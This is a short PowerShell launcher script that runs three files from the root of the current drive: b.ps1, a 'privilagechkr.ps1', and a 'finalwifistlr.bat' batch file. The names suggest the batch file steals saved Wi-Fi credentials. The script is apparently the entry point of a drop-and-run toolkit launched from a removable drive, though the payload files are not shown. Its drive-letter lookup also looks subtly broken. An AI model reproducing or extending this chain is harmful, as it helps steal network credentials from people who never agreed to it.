# Get the current working directory
$currentDirectory = Get-Location

# Extract the drive letter
$driveLetter = $currentDirectory.Provider.Drive.Name

# Display the drive letter
#Write-Host "Current Drive Letter: $driveLetter"





# Run the first script
Write-Host "Running Script 1..."
& "$driveLetter\b.ps1"

# Run the second script
Write-Host "Running Script 2..."
& "$driveLetter\privilagechkr.ps1"

# Run the batch script
Write-Host "Running Batch Script..."
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $driveLetter\finalwifistlr.bat"

# Run the second script
#Write-Host "Running Script 2..."
#& "$driveLetter\path.lnk"



Write-Host "Scripts completed."
